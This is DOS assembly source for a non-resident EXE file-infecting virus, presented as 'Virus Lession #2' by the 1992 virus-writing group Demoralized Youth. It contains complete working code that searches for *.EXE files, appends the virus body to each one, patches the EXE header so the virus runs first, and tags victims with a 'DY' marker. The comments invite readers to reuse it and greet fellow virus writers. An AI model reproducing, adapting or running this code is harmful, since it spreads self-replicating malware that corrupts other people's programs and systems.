;
;	Virus Lession #2 	'How to make a non-resident EXE infector'
;
;	(c) 1992 Tormentor // Demoralized Youth
;
;	Well, I had not time to comment this code as much as I wanted to,
;	but here you are.
; 	What can be hard to understand is the .EXE header changes, but if
;	you look at the description on the header (ex: Norton guide Tech. Ref)
;	you'll understand...
;	Anyway, feel free to use this example and if you have any questions
;	or anything call my board: Swedish Virus Labratory +46-3191-9393
; 	
;	Greetings to all virus-writers!
;
;	/Tormentor
;



		.model	tiny
		.radix	16
		.code
	
Virus_Lenght	EQU	Virus_End-Virus_Start	; Lenght of virus.

		org	100

Virus_Start:	call	where_we_are	
					
where_we_are:	pop	si		
					
		sub	si,where_we_are-Virus_Start

		mov	ax,es
		add	ax,10
		add	ax,cs:[si+Exe_header-Virus_Start+16]
		push	ax
		push	cs:[si+Exe_header-Virus_Start+14]

		push	ds
		push	cs
		pop	ds		

		mov	ah,1a
		mov	dx,offset Own_dta-Virus_Start
		add	dx,si
		int	21

		mov	ah,4e		; We start to look for a *.EXE file
look4victim:	mov	dx,offset file_match-Virus_Start
		add	dx,si
		int	21		

		jnc	cont2
		jmp	no_victim_found ; If no *.EXE files was found.
		
cont2:		mov	ax,3d02		
		mov	dx,Own_dta-Virus_Start+1e
		add	dx,si		
		int	21		
		
		jnc	cont1
		jmp	cant_open_file	
		
cont1:		xchg	ax,bx		
		
		mov	ah,3f		
		mov	cx,1c		
		mov	dx,offset Exe_header-Virus_Start
		add	dx,si
		int	21		
		
		jc	read_error

		cmp	byte ptr ds:[si+Exe_header-Virus_Start],'M'
		jnz	no_exe		; !!! Some EXEs starts with ZM !!!	
		cmp	word ptr ds:[si+Exe_header-Virus_Start+12],'DY'
		jz	infected

		mov	ax,4202		; Go EOF
		xor	cx,cx		
		xor	dx,dx		
		int	21		

		push	dx
		push	ax
		
		mov	ah,40		; Write virus to EOF.
		mov	cx,Virus_Lenght	
		mov	dx,si		
		int	21		

		mov	ax,4202		; Get NEW filelenght.
		xor	cx,cx
		xor	dx,dx
		int	21

		mov	cx,200
		div	cx
		inc	ax
		mov	word ptr ds:[Exe_header-Virus_Start+2+si],dx
		mov	word ptr ds:[Exe_header-Virus_Start+4+si],ax

		pop	ax
		pop	dx

		mov	cx,10
		div	cx
		sub	ax,word ptr ds:[Exe_header-Virus_Start+8+si]
		mov	word ptr ds:[Exe_header-Virus_Start+16+si],ax
		mov	word ptr ds:[Exe_header-Virus_Start+14+si],dx

		mov	word ptr ds:[Exe_header-Virus_Start+12+si],'DY'

		mov	ax,4200		; Position file-pointer to begin of file
		xor	cx,cx		
		xor	dx,dx		
		int	21		

		mov	ah,40		; Write header
		mov	cx,1c
		mov	dx,offset Exe_header-Virus_Start
		add	dx,si
		int	21		
		
		jc	write_error

no_exe:
infected:
		mov	ah,3e		
		int	21		

Sick_or_EXE:	mov	ah,4f		
		jmp	look4victim	

write_error:		; Here you can test whats went wrong.
read_error:		; This is just for debugging purpose.
cant_open_file:		; These entries are equal to eachother
no_victim_found:	; but could be changed if you need to test something.
					
		pop	ds
		retf

file_match	db	'*.EXE',0	; Pattern to search for.
					; Don't forget to end with 0 !

Exe_header	db	16 DUP(0)
		dw	0fff0		; Adjustment just for this COM-file.		
		db	4  DUP(0)

notes		db	'(c) 1992 Tormentor / Demoralized Youth ',0a,0d
		db	'Rather first in hell, than second in heaven.'

Own_Dta		db	02bh DUP(0)

Virus_End	EQU	$	

		end	Virus_Start
